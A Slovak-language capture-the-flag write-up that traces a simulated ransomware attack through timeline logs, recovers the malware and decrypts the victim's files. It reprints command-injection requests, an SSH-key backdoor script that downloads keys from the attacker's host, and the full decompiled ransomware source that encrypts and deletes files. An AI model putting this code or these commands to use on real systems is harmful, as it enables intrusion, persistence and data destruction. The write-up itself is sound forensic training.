# Zadanie

Hi, emergency troubleshooter,

hurry to the SSD (Support Services Department) – they’ve received a threatening e-mail, probably from a recently dismissed employee. It threatens both the loss and the disclosure of our organization’s data. The situation needs to be investigated.

Stay grounded!

- [Download threatening message](threatening_message.zip)
- [Download materials for analysis](image.zip)

**Súbory**

- [threatening_message.zip](threatening_message.zip)
- [image.zip](image.zip)

**Hints**

- Beware! You may face the real malware in this challenge.

## Riešenie

Takže k dispozícii máme ransomware správu a plaso súbor.

Podľa dostupnýcj informácií na internete je plaso vlastne akýsi sqlite image súbor s event logmi, takže ako prvé som skúsil niečo čo mi aj internet odporúčil a to log2timeline/plaso. 

Spustil som príkazom `docker run -v /mnt/c/ctf/TheCatch2025/threatMsg:/data log2timeline/plaso psort -o dynamic -w /data/evid/timeline.csv /data/image.plaso` vyextrahovať časovú os do priečinka evid...

Atu mám teda po dĺĺĺĺhej a veľmi hlbokej analýze report.

Čo sa teda dialo? 

```
10:06:20  SSH login: powerguy z 2001:db8:7cc::25:11:37436
          ├─ Port: 37436
          ├─ Autentifikácia: password
          └─ UID: 1001

10:06:24  Sudo aktivita detekovaná
          └─ Vytvorenie /run/sudo/ts/powerguy

10:06:26  ESKALÁCIA NA ROOT:
          ├─ Príkaz: sudo /usr/bin/su
          ├─ Z používateľa: powerguy (UID 1001)
          ├─ Na používateľa: root (UID 0)
          └─ TTY: pts/0, PWD: /home/powerguy

10:06:31  NOVÝ SÚBOR: /etc/cron.d/powercheck
          ├─ Owner: root (0)
          ├─ Group: root (0)
          ├─ Permissions: -rw-r--r--
          ├─ MD5: 652ba857a8551f5d11b20133349a816d
          └─ CRON JOB - AUTOMATICKÉ SPÚŠŤANIE!

10:06:31  NOVÝ SÚBOR: /usr/local/bin/power_check.sh
          ├─ Owner: root (0)
          ├─ Group: 998 (Neštandardná skupina!)
          ├─ Permissions: -rwxrwxr-x (Príliš permisívne!)
          ├─ MD5: d78bd99f245f676411843375f9ddc68d
          └─ SPUSTITEĽNÝ SKRIPT!

Permissions: -rwxrwxr-x
             Owner: rwx (read, write, execute)
             Group: rwx (skupina môže upraviť!)
             Others: r-x (môžu čítať a spúšťať)
Problém:     Umiestnený v /usr/local/bin (automaticky v PATH)

...

12:06:16  SSH login: powergrid z 10.99.25.22:40206
          ├─ UID: 1000 (iný používateľ ako powerguy!)
          ├─ Autentifikácia: password
          └─ Session opened

12:06:17  PRÍKAZ: sudo cat /etc/passwd
          ├─ TTY: pts/0
          ├─ PWD: /home/powergrid
          ├─ USER: root
          └─ ČÍTANIE SYSTÉMOVÝCH ÚČTOV!

12:06:20  PRÍKAZ: sudo passwd powergrid
          └─ ✓ Password changed for powergrid

12:06:26  PRÍKAZ: sudo passwd powerguy  
          └─ ✓ Password changed for powerguy

- Útočník zmenil heslo oboch účtov!
- Má kontrolu nad 'powergrid' aj 'powerguy'
- Lock out legitímnych administrátorov!
- Zabezpečuje si trvalý prístup

12:06:29  VYTVORENIE: /home/powergrid/.ssh/
          ├─ Owner: powergrid (1000)
          ├─ Permissions: drwxr-xr-x
          └─ SSH KEYS ADRESÁR!

Prvýkrát iný status nového cron jobu než status code 0 (ok)
12:10:01  CRON EXECUTION: power_check.sh
          └─ OUTPUT: "status code 3 (hotfix applied)"

Prvýkrát status code 3 (hotfixed) až do 15:10:01
12:15:01  CRON EXECUTION: power_check.sh
          └─ OUTPUT: "status code 3 (hotfixed)"

3 neúspešné pokusy o prihlásenie používateľa doublepower
15:12:59  SSH pokus 1: doublepower z 2001:db8:7cc::25:28:44432
          └─ Status: Connection closed [preauth] ✗

15:13:04  SSH pokus 2: doublepower z 2001:db8:7cc::25:28:44442
          └─ Status: Connection closed [preauth] ✗

15:13:06  SSH pokus 3: doublepower z 2001:db8:7cc::25:28:44452
          └─ Status: Connection closed [preauth] ✗

Zistenie info o aktuálnom používateľovi
15:13:00  REQUEST: GET /get_user_by__iid?q=whoami
          IP: 10.99.25.28
          User-Agent: curl/7.88.1
          Response: HTTP 200

Získanie zoznamu všetkých používateľov systému
15:13:03  REQUEST: GET /get_user_by__iid?q=cat%20/etc/passwd
          IP: 10.99.25.28
          User-Agent: curl/7.88.1
          Response: HTTP 200

Overenie, že curl je dostupný v systéme
15:13:10  GET /get_user_by__iid?q=curl%20-h
          IP: 10.99.25.28
          User-Agent: curl/7.88.1
          Response: HTTP 200

Stiahnutie malware
15:13:14  REQUEST: GET /get_user_by__iid?q=curl%20http%3A%2F%2F%5B2001%3Adb8%3A7cc%3A%3A25%3A28%5D%2Fmy%2Fbackup2%20-o%20%2Ftmp%2Fbackup.sh
          IP: 10.99.25.28
          User-Agent: curl/7.88.1
          Response: HTTP 200
```

Útočník stiahol zo svojho servera skript zneužitím php endopitu pri ktorom vykonal príkaz `curl http://[2001:db8:7cc::25:28]/my/backup2 -o /tmp/backup.sh`

Server je zdá sa aktívny, súbor som stiahol a skript vyzerá takto

```bash
#!/bin/bash

mkdir -p /home/doublepower/.ssh
chown doublepower:doublepower /home/doublepower/.ssh
chmod 700 /home/doublepower/.ssh

curl http://[2001:db8:7cc::25:28]/my/authorized_keys -o /home/doublepower/.ssh/authorized_keys
chown doublepower:doublepower /home/doublepower/.ssh/authorized_keys
chmod 600 /home/doublepower/.ssh/authorized_keys
```

Už z podozrivých logov je jasné, že útočník sa pokúšal prihlásiť ako používateľ doublepower, ale neúspešne. Z tohto skriptu je jasný zámer - je jasné že si chce uľahčiť prihlásenie a pridáva si autorizované public kľúče do svojej .ssh zložky. 

Tu je snippet z adresy `http://[2001:db8:7cc::25:28]/my/authorized_keys`

> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDfNdTWbbR36jcWvd/llRWiflkogmDP2i9WdyfPrTo4pWFZBpU7atijn/z8q5pBZK3WL8dsKhxaEnhq4Jxx3BNoGEhz37q+IqET8XcTv/xwKypMFmnIQJjjmaz4YaZIMLs5ZkCe4xGXVaeu4pQzJ+4b1ixA0CArN5eM2czqzZWbiFsgJLryhqf9Gtj6tZg5ZEw4ApRO5lWQMb/JnneHxgGfBdCy9poszV2Z1XW+kSwz25LsBY6PfHlP6YMCTTAuk1346kns/vGgkS1ckvk7JrsqXNfG9/t+ae02OfvRVvnn4il7B5gufC565xMcScIvxKUEwiNEFqIV5z0PGBSrYvIyAhAkVbqsDz2WSNxb5LPATE2oMAwsl8L4fraam/Lg9yGQG79nNulvM62XWXXL+mkjL1xUm+SAQDGqif2uor8j129DP2BmafRuSe/JP7oPAHOetGrR9Y1VomkwKO6xTfUX6Fjb2uYePcZUha1Bb7gRVTiwur3XZxBNiYHGh4Qqn2Yg+iSm8lJ/EgiI2Y2jbrArYE0+W4b7Pqq8i5pIxpFJm40t6Jslql4AP/URWhwPy7HCycTnP93DVYEi5I3IZ6lJSgZWaoYuawHBDnbA3UTB8aVlxu7aHMuLQYhlQdrm5912N5Vtoe1J6Qe6kGIICUb+ORYQR2q0F76fVkX5idj5BQ== dough.badman@doublepower.tcc

Odpoveď na to, ako príkaz spustí je zrejme v tom, že sa vyskytol jedinečný stav po cron úlohe a zrejme sa dialo toto

```
15:15:01  CRON SPUSTENÝ: /usr/local/bin/power_check.sh
          ├─ User: root
          ├─ PID: 884
          ├─ Output: "Performing power health check ... 
          |           status code 3 backup available (hotfixed)"
          │
          │  Hypotéza:
          │
          ├─ 1. /usr/local/bin/power_check.sh beží
          │
          ├─ 2. Kontroluje: "Existuje /tmp/backup.sh?"
          │    └─ ÁNO, existuje!
          │
          ├─ 3. VYKONÁVA: bash /tmp/backup.sh
          │    │
          │    └─ /tmp/backup.sh vytvára:
          │        ├─ Nový účet: useradd doublepower (UID 1002)
          │        ├─ SSH adresár: mkdir /home/doublepower/.ssh
          │        └─ SSH backdoor: echo "ssh-rsa AAAA..." > authorized_keys
          │
          ├─ 4. Komunikuje s útoč. serverom : HTTP → 2001:db8:7cc::25:28:80
          │
          └─ 5. Reportuje: "status code 3 backup available (hotfixed)"
```

pretože sa spomína backup available, takže tu sa zrejme spustil skript s názvom basckup.sh a od tohto momentu má utočník voľné ruky na vykonanie ransomware útoku.

```
15:30:01  Cron job: power_check.sh
          ├─ Output: "status code 3 (hotfixed)"
          └─ BEZ "backup available" - malware už prebehol!

15:30:26  SSH CONNECTION START
          ├─ Packets: 188 → / 206 ←
          ├─ Bytes: 20,336 → / 14,092 ←
          ├─ Duration: 37.405 seconds
          └─ Veľmi dlhé spojenie!

15:30:27  SSH LOGIN SUCCESSFUL
          ├─ User: doublepower
          ├─ From: 2001:db8:7cc::25:28:48308
          ├─ Method: publickey (PASSWORDLESS!)
          └─ Key: RSA SHA256:QJlzJLzHmN4rfu6WEmd+Zk8xQAL9oXuRdmk8btdsAI8

15:30:28  STIAHNUTÝ SÚBOR s ransomware-om: /home/doublepower/sc
          ├─ Owner: doublepower (1002)
          ├─ Permissions: -rwxr-xr-x (EXECUTABLE!)
          ├─ MD5: ae0ce366b097f6150f4da3b75e4890a1
          └─ Size: ~6.5 MB!

          NetFlow:
          ├─ Source: 2001:db8:7cc::25:28:80 (C&C server)
          ├─ Destination: 10.99.25.252:40510
          ├─ Packets: 134 → / 200 ←
          ├─ Bytes: 4,389 → / 6,494,521 ← (6.5 MB!)
          └─ Duration: 0.053s (rýchle stiahnutie!)

15:30:32  STIAHNUTÝ SÚBOR: /home/doublepower/enc
          ├─ Owner: doublepower (1002)
          ├─ Permissions: -rw-r--r--
          ├─ MD5: 814ba8dd6ef58933fb84203d4c53b9f8
          └─ Size: ~900 bytes (malý súbor)

          NetFlow:
          ├─ Source: 2001:db8:7cc::25:28:80
          ├─ Bytes: 342 → / 872 ←
          └─ Duration: 0.012s

15:30:34  Sudo access získaný
          └─ /run/sudo/ts/doublepower created

15:30:35  RANSOMWARE COMMAND EXECUTED:
          ├─ Command: sudo /home/doublepower/sc encrypt /srv/shared /home/doublepower/enc
          ├─ User: doublepower → root
          ├─ TTY: pts/0
          │
          └─ PARAMETERS:
              • "encrypt" - režim "zašifruj"
              • "/srv/shared" - cieľový adresár
              • "/home/doublepower/enc" - encryption key

15:30:38  Private RSA Key (zrejme openssh private kľúč)
          FILE: /home/doublepower/rsa
          ├─ Owner: doublepower (1002:1002)
          ├─ Permissions: -rw------- (PRIVATE - iba owner!)
          ├─ Size: ~3.8 KB
          ├─ MD5: b5d26273af2c20c43b2df865380b5266
          ├─ Created: 15:30:38

15:30:44  COMMAND EXECUTED:
          └─sudo tar -czf /home/doublepower/shared.tar.gz /srv/shared    

15:30:44 Vytvorený archív
          FILE: /home/doublepower/shared.tar.gz
          ├─ Owner: doublepower (1002:1002) [after chown]
          ├─ Permissions: -rw-r--r--
          ├─ Size: ??? (nie je v logoch uvedené)
          ├─ MD5: 52b3bf73e3d9b52bca61196cbdfce081
          ├─ Created: 15:30:44
          └─ Content: Všetky .enc súbory z /srv/shared

15:30:51  DATA EXFILTRATION: SSH Upload
          ├─ Protocol: SSH/SCP
          ├─ Destination: 2001:db8:7cc::25:29:22
          ├─ Files: shared.tar.gz (most probably)
          | 
          ├─ [nfdump] FLOW TCP 2001:db8:7cc::25:252 34934 -> 2001:db8:7cc::25:29 22 Packets=37 Bytes=70304 Duration=0.419
          └─ [nfdump] FLOW TCP 2001:db8:7cc::25:29 22 -> 2001:db8:7cc::25:252 34934 Packets=28 Bytes=6260 Duration=0.419


15:30:59  KOPÍROVANÉ: /home/powergrid/read.me
          ├─ Command: sudo cp /home/doublepower/read.me /home/powergrid/read.me
          └─ Permissions: -rwxrwxrwx (777 - čitateľný pre všetkých!)

15:31:02  KOPÍROVANÉ: /srv/shared/read.me
          ├─ Command: sudo cp /home/doublepower/read.me /srv/shared/read.me
          └─ Permissions: -rwxrwxrwx (777)

15:31:02-03  chmod 777 na obe poznámky
             └─ Aby ich videl KAŽDÝ!

15:31:04  SSH DISCONNECT
          ├─ User: doublepower
          ├─ From: 2001:db8:7cc::25:28:48308
```

Všade figuruje IP adresa `10.99.25.28` prípadne jej IPV6 náprotivok `2001:db8:7cc::25:28` . Dokonca je index page na tejto ip adrese z obrázkom doublepower.. 

![](default.png)

Vidím, že súbory boli stiahnuté z tejto IP adresy, akurát šifrovací kľúč ransomweru, ani samotný ransomware nie je známy na akej url leží. Je čas urobiť enumeráciu a zistiť, čo má dostupné.

```
$ gobuster dir -u http://10.99.25.28/ -w ../common.txt -t 50
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.99.25.28/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                ../common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/current              (Status: 301) [Size: 169] [--> http://10.99.25.28/current/]
/index.html           (Status: 200) [Size: 329]
/keys                 (Status: 301) [Size: 169] [--> http://10.99.25.28/keys/]
/my                   (Status: 301) [Size: 169] [--> http://10.99.25.28/my/]
/ssh                  (Status: 301) [Size: 169] [--> http://10.99.25.28/ssh/]
/tools                (Status: 301) [Size: 169] [--> http://10.99.25.28/tools/]
Progress: 4614 / 4614 (100.00%)
===============================================================
Finished
===============================================================
```

Priečinky `my` a `tools` bol zamknuté, ale zvyšok som prešiel a objavil tam 

```
$ tree downloaded/
downloaded/
├── current
│   ├── case01
│   │   ├── IMG_7059.HEIC
│   │   ├── IMG_7068.HEIC
│   │   ├── IMG_7074.HEIC
│   │   ├── IMG_7090.HEIC
│   │   └── read.me
│   └── case02
│       └── read.me
├── keys
│   ├── key_100067821798.pem
│   ├── key_100067821798.pub
│   ├── key_100184838173.pem
│   ├── key_100184838173.pub
│   ├── key_101521682059.pem
│   ├── key_101521682059.pub
│   ...
│   ├── key_990311063301.pem
│   ├── key_990311063301.pub
│   ├── key_990399968225.pem
│   ├── key_990399968225.pub
│   ├── key_993211727236.pem
│   └── key_993211727236.pub
└── ssh
    ├── id_doublepower_01
    ├── id_doublepower_01.pub
    ...
    ├── id_doublepower_16
    └── id_doublepower_16.pub
```

V priečinku current bol ransomware správy pre obete, case02 je náš prípad.

V priečinku keys bolo veľké množstvo rsa kľúčov, zrejme jeden z nich bol použitý na zašifrovanie súborov obete.

V priečinku ssh boli private a public OpenSSH kľúče, ale vo verejných kľúčoch boli používatelia `01@fearme.tcc - 16@fearme.tcc`.

Potrebujem nájsť ešte samotný ransomware, možno bude v tools priečinku. 

A teda áno `http://10.99.25.28/tools/sc`. Od esetu rovno dostávam hlášku o tom, že ide o `Python/TrojanDropper.Agent.GW` (hint varoval, že ide o aktívny malware :D )- pri pokuse o dekompilovanie ghidrou som videl samý balast, ale zároveň som zistil, že zrejme pôjde o pyinstallerom vytvorenú binárku. Existuje nástroj pyinstxtractor, ktorý by nám vedel pomôcť s dekompiláciou do zdrojového python kódu, alebo minimálne pyc súboru. Dokonca existuje aj web verzia https://pyinstxtractor-web.netlify.app/

Vložil som tam binárku a už to chrúmalo.

```
[+] Please stand by...
[+] Processing sc
[+] Pyinstaller version: 2.1+
[+] Python library file: libpython3.11.so
[+] Python version: 3.11
[+] Length of package: 11904070 bytes
[+] Found 42 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: pyi_rth_cryptography_openssl.pyc
[+] Possible entry point: sc.pyc
[+] Found 137 files in PYZArchive
[+] Successfully extracted pyinstaller archive: sc

You can now use a python decompiler on the pyc files within the extracted directory
[+] Extraction completed successfully, downloading zip
```

Mám teraz zip priečinok z pyc súbormi, čo je vlastne python bytecode. Nevadí. V archíve je aj `sc.pyc`, ktorý teraz vložím do https://pylingual.io/ a máme zdroják nášho ransomware-u.

```python
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: sc.py
# Bytecode version: 3.11a7e (3495)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import os
import argparse
from pathlib import Path
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.exceptions import InvalidSignature
import secrets

def load_public_key(path):
    with open(path, 'rb') as key_file:
        return serialization.load_pem_public_key(key_file.read(), backend=default_backend())

def load_private_key(path):
    with open(path, 'rb') as key_file:
        return serialization.load_pem_private_key(key_file.read(), password=None, backend=default_backend())

def encrypt_file(file_path, public_key):
    aes_key = secrets.token_bytes(32)
    iv = secrets.token_bytes(16)
    with open(file_path, 'rb') as f:
        data = f.read()
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(data) | encryptor.finalize()
    encrypted_key = public_key.encrypt(aes_key, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
    with open(f'{file_path}.enc', 'wb') as f:
        f.write(len(encrypted_key).to_bytes(4, byteorder='big'))
        f.write(encrypted_key)
        f.write(iv)
        f.write(encrypted_data)
    os.remove(file_path)
    print(f'[+] Encrypted: {file_path}')

def decrypt_file(file_path, private_key):
    with open(file_path, 'rb') as f:
        key_len = int.from_bytes(f.read(4), byteorder='big')
        encrypted_key = f.read(key_len)
        iv = f.read(16)
        encrypted_data = f.read()
    aes_key = private_key.decrypt(encrypted_key, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(encrypted_data) | decryptor.finalize()
    output_path = str(file_path)[:-4]
    with open(output_path, 'wb') as f:
        f.write(decrypted_data)
    os.remove(file_path)
    print(f'[+] Decrypted: {file_path}')

def process_directory(mode, directory, key_path):
    key_path = Path(key_path)
    if not key_path.exists():
        print(f'[!] Key file not found: {key_path}')
        return
    if mode == 'encrypt':
        public_key = load_public_key(key_path)
    elif mode == 'decrypt':
        private_key = load_private_key(key_path)
    else:
        print("[!] Invalid mode. Use 'encrypt' or 'decrypt'.")
        return
    for root, dirs, files in os.walk(directory):
        for file in files:
            full_path = Path(root) | file
            if mode == 'encrypt' and (not file.endswith('.enc')):
                encrypt_file(full_path, public_key)
            elif mode == 'decrypt' and file.endswith('.enc'):
                decrypt_file(full_path, private_key)

def main():
    parser = argparse.ArgumentParser(description='Encrypt or decrypt files in a directory using RSA and AES hybrid encryption.')
    parser.add_argument('mode', choices=['encrypt', 'decrypt'], help='Mode: encrypt or decrypt')
    parser.add_argument('directory', help='Absolute path to directory')
    parser.add_argument('key', help='Path to RSA public (encrypt) or private (decrypt) key')
    args = parser.parse_args()
    process_directory(args.mode, args.directory, args.key)
if __name__ == '__main__':
    main()
```

Binárka `sc` je **hybrid RSA + AES encryption/decryption nástroj** s týmito vlastnosťami:

- **Šifrovanie**: Kombinuje RSA-OAEP (na šifrovanie AES klúča) + AES-256-CFB (na šifrovanie dát)
- **Použitie**: `./sc {encrypt|decrypt} <directory> <key_file>`
- **Formát**: Vytvára `.enc` súbory so štruktúrou: `[key_len][encrypted_key][iv][encrypted_data]`

Good! Mám kľúče, ktoré by som mohol použiť na dešifrovanie, mám ssh kľúče, ktoré evokujú, že sa niekde mám pripojiť, zrejmé je to aj z logu, kde útočník použil nejaký z nich na exfiltráciu archívu, ktorý zrejme teda nájdem na 10.99.25.29 a používateľ bude zrejme jeden z `01 - 16`. A keďže ich nebolo veľa, dalo sa skúsiť aj ručne a bol to `11`.

Pripojenie sa podarilo

```shell
$ ssh -i ~/id_doublepower_11 11@10.99.25.29
$ ls -la
total 88
drwx------ 1 11   11    4096 Aug 27 13:15 .
drwxr-xr-x 1 root root  4096 Aug 27 13:15 ..
-rw------- 1 11   11     220 Apr 18  2025 .bash_logout
-rw------- 1 11   11    3526 Apr 18  2025 .bashrc
-rw------- 1 11   11     807 Apr 18  2025 .profile
drwx------ 1 11   11    4096 Aug 27 13:15 .ssh
-rw------- 1 11   11   63555 Aug 27 13:15 shared.tar.gz
```

Teraz sa pripojím cez scp a stiahnem archív k sebe.

```shell
$ scp -i ~/id_doublepower_11 11@10.99.25.29:shared.tar.gz .
shared.tar.gz                 100%   62KB 830.0KB/s   00:00
```

Mám zdroják ransowmware, viem teda ako bolo šifrované, mám k dispozícii 512 pem kľúčov, dúfam, že to bude jeden z nich. Idem dešifrovať.

Gemini mi napísal takýto pekný skript

```python
#!/usr/bin/env python3

"""
Skript na nájdenie správneho súkromného kľúča a dešifrovanie súborov
zašifrovaných skriptom 'sc.py'.

Tento skript najprv bezpečne testuje kľúče, kým nenájde ten správny.
Potom, po potvrdení používateľom, dešifruje všetky súbory.
"""

import os
import argparse
import sys
from pathlib import Path
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# --- Funkcie prebraté a upravené z vášho 'sc.py' ---

def load_private_key(path):
    """Načíta súkromný PEM kľúč zo súboru."""
    with open(path, 'rb') as key_file:
        try:
            return serialization.load_pem_private_key(
                key_file.read(),
                password=None,
                backend=default_backend()
            )
        except Exception as e:
            print(f"  [!] Chyba pri načítaní kľúča {path}: {e}", file=sys.stderr)
            return None

def try_decrypt_file(file_path, private_key):
    """
    Pokúsi sa dešifrovať jeden súbor bez zmazania originálu.
    Vráti True pri úspechu, False pri neúspechu.
    """
    output_path = str(file_path)[:-4] + ".TEST_DECRYPT"
    try:
        with open(file_path, 'rb') as f:
            key_len = int.from_bytes(f.read(4), byteorder='big')
            encrypted_key = f.read(key_len)
            iv = f.read(16)
            encrypted_data = f.read()

        aes_key = private_key.decrypt(
            encrypted_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

        # Ak dešifrovanie prebehlo, zapíšeme súbor
        with open(output_path, 'wb') as f:
            f.write(decrypted_data)

        # Overíme, či sa súbor vytvoril a nie je prázdny
        if os.path.exists(output_path) and os.path.getsize(output_path) > 0:
             # Upraceme po sebe testovací súbor
            os.remove(output_path)
            return True
        else:
            if os.path.exists(output_path):
                os.remove(output_path) # Zmažeme prázdny súbor
            return False

    except Exception as e:
        # Akýkoľvek problém (napr. zlý kľúč, padding error) znamená neúspech
        if os.path.exists(output_path):
            os.remove(output_path) # Upraceme, ak by náhodou ostal
        return False

def decrypt_file_and_remove(file_path, private_key):
    """
    Dešifruje súbor a zmaže pôvodný .enc súbor.
    Toto je finálna dešifrovacia funkcia.
    """
    output_path = str(file_path)[:-4]
    try:
        with open(file_path, 'rb') as f:
            key_len = int.from_bytes(f.read(4), byteorder='big')
            encrypted_key = f.read(key_len)
            iv = f.read(16)
            encrypted_data = f.read()

        aes_key = private_key.decrypt(
            encrypted_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

        with open(output_path, 'wb') as f:
            f.write(decrypted_data)

        os.remove(file_path)
        print(f"[+] Dešifrované: {file_path} -> {output_path}")

    except Exception as e:
        print(f"[!] CHYBA pri dešifrovaní {file_path}: {e}", file=sys.stderr)
        print(f"    Súbor {file_path} nebol zmazaný.", file=sys.stderr)

# --- Nové funkcie pre hľadanie kľúča a hromadné dešifrovanie ---

def find_correct_key(keys_dir, encrypted_dir):
    """
    Prejde všetky .pem kľúče a nájde ten, ktorý dokáže dešifrovať testovací súbor.
    """
    print(f"[.] Hľadám .pem kľúče v adresári: {keys_dir}")
    key_files = list(Path(keys_dir).rglob("*.pem"))
    if not key_files:
        print(f"[!] Nenašli sa žiadne .pem kľúče v {keys_dir}", file=sys.stderr)
        return None

    print(f"[.] Nájdených {len(key_files)} .pem kľúčov.")

    print(f"[.] Hľadám testovací .enc súbor v: {encrypted_dir}")
    test_file = next(Path(encrypted_dir).rglob("*.enc"), None)
    if not test_file:
        print(f"[!] Nenašiel sa žiadny .enc súbor v {encrypted_dir}", file=sys.stderr)
        return None

    print(f"[.] Použijem testovací súbor: {test_file}")

    for i, key_path in enumerate(key_files):
        print(f"\r[.] Testujem kľúč {i+1}/{len(key_files)}: {key_path.name} ...", end="")
        sys.stdout.flush()

        private_key = load_private_key(key_path)
        if private_key is None:
            continue # Chybu už vypísal load_private_key

        if try_decrypt_file(test_file, private_key):
            print("\n" + "="*70)
            print(f"[+] ÚSPECH! Nájdený správny kľúč:")
            print(f"[+] {key_path}")
            print("="*70)
            return key_path

    print("\n[!] CHYBA: Žiaden z kľúčov nefungoval na testovací súbor.", file=sys.stderr)
    return None

def decrypt_all_files(encrypted_dir, correct_key_path):
    """
    Prejde celý adresár a dešifruje všetky .enc súbory pomocou správneho kľúča.
    """
    print(f"\n[.] Začínam hromadné dešifrovanie v adresári: {encrypted_dir}")
    print(f"[.] Používam kľúč: {correct_key_path}")

    private_key = load_private_key(correct_key_path)
    if private_key is None:
        print(f"[!] Kritická chyba: Nepodarilo sa znova načítať správny kľúč.", file=sys.stderr)
        return

    files_to_decrypt = list(Path(encrypted_dir).rglob("*.enc"))
    print(f"[.] Nájdených {len(files_to_decrypt)} súborov na dešifrovanie.")

    for file_path in files_to_decrypt:
        decrypt_file_and_remove(file_path, private_key)

    print("\n[+] Hromadné dešifrovanie dokončené.")

def main():
    parser = argparse.ArgumentParser(description='Nájde správny kľúč a dešifruje súbory.')
    parser.add_argument('keys_directory', help='Cesta k adresáru s .pem kľúčmi')
    parser.add_argument('encrypted_directory', help='Cesta k adresáru so zašifrovanými .enc súbormi')
    args = parser.parse_args()

    # Krok 1: Nájdi správny kľúč
    correct_key = find_correct_key(args.keys_directory, args.encrypted_directory)

    if correct_key:
        # Krok 2: Potvrdenie od používateľa
        print("\nVAROVANIE: Chystáte sa spustiť hromadné dešifrovanie.")
        print("Tento proces dešifruje všetky .enc súbory v adresári")
        print(f"'{args.encrypted_directory}' (vrátane podadresárov)")
        print(f"a po úspešnom dešifrovaní zmaže pôvodné .enc súbory.")

        try:
            choice = input("\nPrajete si pokračovať? (y/N): ").strip().lower()
        except EOFError:
            choice = 'n' # Ak sa používa v pipe, radšej nie

        if choice == 'y':
            # Krok 3: Spustenie hromadného dešifrovania
            decrypt_all_files(args.encrypted_directory, correct_key)
        else:
            print("\n[.] Operácia zrušená používateľom. Súbory neboli zmenené.")
    else:
        print("\n[.] Program ukončený. Žiaden kľúč sa nenašiel.")
        sys.exit(1)

if __name__ == '__main__':
    main()
```

ktorý som následne použil

```shell
$ python brute_decrypt.py downloaded/keys encrypted_data/srv/shared
[.] Hľadám .pem kľúče v adresári: downloaded/keys
[.] Nájdených 512 .pem kľúčov.
[.] Hľadám testovací .enc súbor v: encrypted_data/srv/shared
[.] Použijem testovací súbor: encrypted_data/srv/shared/grid-ops/field_notebook542.md.enc
[.] Testujem kľúč 82/512: key_140261531202.pem ...
======================================================================
[+] ÚSPECH! Nájdený správny kľúč:
[+] downloaded/keys/key_140261531202.pem
======================================================================

VAROVANIE: Chystáte sa spustiť hromadné dešifrovanie.
Tento proces dešifruje všetky .enc súbory v adresári
'encrypted_data/srv/shared' (vrátane podadresárov)
a po úspešnom dešifrovaní zmaže pôvodné .enc súbory.

Prajete si pokračovať? (y/N): y

[.] Začínam hromadné dešifrovanie v adresári: encrypted_data/srv/shared
[.] Používam kľúč: downloaded/keys/key_140261531202.pem
[.] Nájdených 8 súborov na dešifrovanie.
[+] Dešifrované: encrypted_data/srv/shared/grid-ops/field_notebook542.md.enc -> encrypted_data/srv/shared/grid-ops/field_notebook542.md
[+] Dešifrované: encrypted_data/srv/shared/grid-ops/repair_log.md.enc -> encrypted_data/srv/shared/grid-ops/repair_log.md
[+] Dešifrované: encrypted_data/srv/shared/other/powerplant_10_yr_stats.md.enc -> encrypted_data/srv/shared/other/powerplant_10_yr_stats.md
[+] Dešifrované: encrypted_data/srv/shared/other/powerplant_selfdestruction.csv.enc -> encrypted_data/srv/shared/other/powerplant_selfdestruction.csv
[+] Dešifrované: encrypted_data/srv/shared/psy-ops/morale_boosting.md.enc -> encrypted_data/srv/shared/psy-ops/morale_boosting.md
[+] Dešifrované: encrypted_data/srv/shared/psy-ops/pill.jpg.enc -> encrypted_data/srv/shared/psy-ops/pill.jpg
[+] Dešifrované: encrypted_data/srv/shared/sci-ops/flabvolt.md.enc -> encrypted_data/srv/shared/sci-ops/flabvolt.md
[+] Dešifrované: encrypted_data/srv/shared/sci-ops/seismovolt.md.enc -> encrypted_data/srv/shared/sci-ops/seismovolt.md

[+] Hromadné dešifrovanie dokončené.
```

Mám dešifrované!

```
shared
├── grid-ops
│   ├── field_notebook542.md
│   └── repair_log.md
├── other
│   ├── powerplant_10_yr_stats.md
│   └── powerplant_selfdestruction.csv
├── psy-ops
│   ├── morale_boosting.md
│   └── pill.jpg
└── sci-ops
    ├── flabvolt.md
    └── seismovolt.md
```

8 súborov, v ktorých dúfam bude vlajka... V `powerplant_selfdestruction.csv` je mnoho base64 výskytov

| Facility              | Left SD operator     | Right SD operator    |
| --------------------- | -------------------- | -------------------- |
| Riverbend Hydro       | QkFEQUJPT017clFGZy0z | dk1MLUN5Y1EtT2hDcH0= |
